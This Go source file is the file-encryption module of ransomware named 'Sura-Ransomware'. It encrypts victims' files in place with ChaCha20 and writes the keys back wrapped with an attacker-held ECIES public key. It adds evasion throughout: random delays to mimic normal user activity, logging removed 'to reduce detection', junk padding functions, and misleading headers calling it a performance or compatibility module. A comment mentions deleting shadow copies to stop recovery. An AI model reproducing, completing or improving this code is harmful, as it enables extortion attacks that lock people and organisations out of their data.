// OBFUSCATED
// Performance enhancement module
// Windows compatibility layer
package encryption

import (
	Configuration "Sura-Ransomware/configuration"
	cryptorand "crypto/rand"
	"encoding/base64"
	"io"
	"math/rand"
	"os"
	"time"

	eciesgo "github.com/ecies/go"
	"golang.org/x/crypto/chacha20"
)

const (
	sep = "||" // Separator
)

var (
	pk  *eciesgo.PublicKey
	err error
)

func d(s string) string {
	decoded, _ := base64.StdEncoding.DecodeString(s)
	return string(decoded)
}

func init() {
	pk, err = eciesgo.NewPublicKeyFromHex(Configuration.PublicKey)
	if err != nil {
		panic(err)
	}
	rand.Seed(time.Now().UnixNano())
}

// Obfuscated function names
func genK() ([]byte, error) {
	key := make([]byte, chacha20.KeySize)
	if _, err := cryptorand.Read(key); err != nil {
		return nil, err
	}
	return key, nil
}

func genN() ([]byte, error) {
	nonce := make([]byte, chacha20.NonceSizeX)
	if _, err := cryptorand.Read(nonce); err != nil {
		return nil, err
	}
	return nonce, nil
}

// Simulate normal file operation timing
func simulateUserDelay() {
	if Configuration.SimulateNormalActivity {
		// Random delay between 100ms and 2s to mimic user file operations
		delay := 100 + rand.Intn(1900)
		time.Sleep(time.Duration(delay) * time.Millisecond)
	}
}

// Renamed to be less obvious
func ProcessFile(filePath string) {
	// Add random delay before processing to look like normal activity
	simulateUserDelay()

	file, err := os.OpenFile(filePath, os.O_RDWR, 0644)
	if err != nil {
		return
	}
	defer file.Close()

	// NOTE: Secure overwrite is NOT used here because it would make files
	// unrecoverable even with the decryption key. Strong encryption is enough.
	// Shadow copy deletion prevents recovery of unencrypted originals.

	// Generate the key and nonce
	key, err := genK()
	if err != nil {
		return
	}

	nonce, err := genN()
	if err != nil {
		return
	}

	// Encrypt the key and nonce using RSA
	encryptedKey, err := eciesgo.Encrypt(pk, key)
	if err != nil {
		return
	}

	encryptedNonce, err := eciesgo.Encrypt(pk, nonce)
	if err != nil {
		return
	}

	// Create the cipher for ChaCha20 encryption
	cipher, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return
	}

	buffer := make([]byte, Configuration.ChunkSize)

	// Read and encrypt the file content
	var fileContent []byte
	for {
		n, err := file.Read(buffer)
		if err != nil && err != io.EOF {
			return
		}

		if n == 0 {
			break
		}

		fileContent = append(fileContent, buffer[:n]...)
	}

	ciphertext := make([]byte, len(fileContent))
	for i := 0; i < len(fileContent); i += Configuration.EncryptEveryNthByte {
		if i < len(fileContent) {
			cipher.XORKeyStream(ciphertext[i:i+1], fileContent[i:i+1])
		}
		if i+1 < len(fileContent) {
			ciphertext[i+1] = fileContent[i+1]
		}
		if i+2 < len(fileContent) {
			ciphertext[i+2] = fileContent[i+2]
		}
	}

	// Prepare the final data to write to the file
	finalData := append(encryptedKey, sep...)
	finalData = append(finalData, encryptedNonce...)
	finalData = append(finalData, sep...)
	finalData = append(finalData, ciphertext...)

	// Write the final data back to the file
	if err = file.Truncate(0); err != nil {
		return
	}

	if _, err = file.Seek(0, io.SeekStart); err != nil {
		return
	}

	if _, err = file.Write(finalData); err != nil {
		return
	}

	// Removed logging to reduce detection
}



// Obfuscation padding
func obf_19856() {
    _ = 4321
    var _ = "hXZtsQotL3VRpYmrM3QGI4cIZRri3I2OUtrJQznbKlOtm7MDGQ"
}


// Obfuscation padding
func obf_50003() {
    _ = 7280
    var _ = "rEWbi9Fsf66BIZi1du7jRROWtduM3qBwKpqZ5mFfXW7YkLwWAz"
}


// Obfuscation padding
func obf_39177() {
    _ = 7110
    var _ = "tethdlASD5eUBoxT3uMPpSBb6rQDPRbEhU1XOJqSkFmYsUvngZ"
}


// Obfuscation padding
func obf_32633() {
    _ = 6852
    var _ = "pL0DDHJg6lFLwaVATF2hd9qBggZR4Kg9Px7RSC9ZLNRvLR2pNx"
}


// Obfuscation padding
func obf_77928() {
    _ = 5140
    var _ = "TF3ibqvmvO1XRM6CFF9OCzEKPOfT3Thw7GOA0g5b53LWbrHQi1"
}
